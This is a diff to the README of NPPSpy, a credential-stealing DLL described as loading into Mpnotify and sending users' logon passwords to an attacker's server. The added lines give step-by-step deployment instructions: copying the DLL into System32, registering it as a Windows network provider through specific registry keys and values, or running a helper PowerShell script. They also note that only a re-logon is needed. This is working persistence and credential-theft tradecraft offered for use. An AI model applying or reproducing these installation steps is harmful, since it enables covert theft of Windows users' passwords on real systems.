@@ -5,6 +5,19 @@ Loads a DLL to Mpnotify and send the password to hacker's server. It is a modifi
 ```
 gcc -shared -o NPPSpy.dll file.c
 ```
+#### Installation:
+1. Copy NPPSpy.dll to the System32 folder
+1. Add `"NPPSpy"` at the end of the `"ProviderOrder"` in `HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order`
+1. Create `HKLM\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider` and set following values:
+   - `"Class" = [REG_DWORD]2`
+   - `"ProviderPath" = [REG_EXPAND_SZ]"%SystemRoot%\System32\NPPSPY.dll"`
+   - `"Name" = [REG_SZ]"NPPSpy"`
+
+OR
+
+Use the ConfigureRegistrySettings.ps1 script (by @LadhaAleem)
+
+Re-logon is required, reboot is not required.
 
 # How it works
 Source: https://www.huntress.com/blog/cleartext-shenanigans-gifting-user-passwords-to-adversaries-with-nppspy
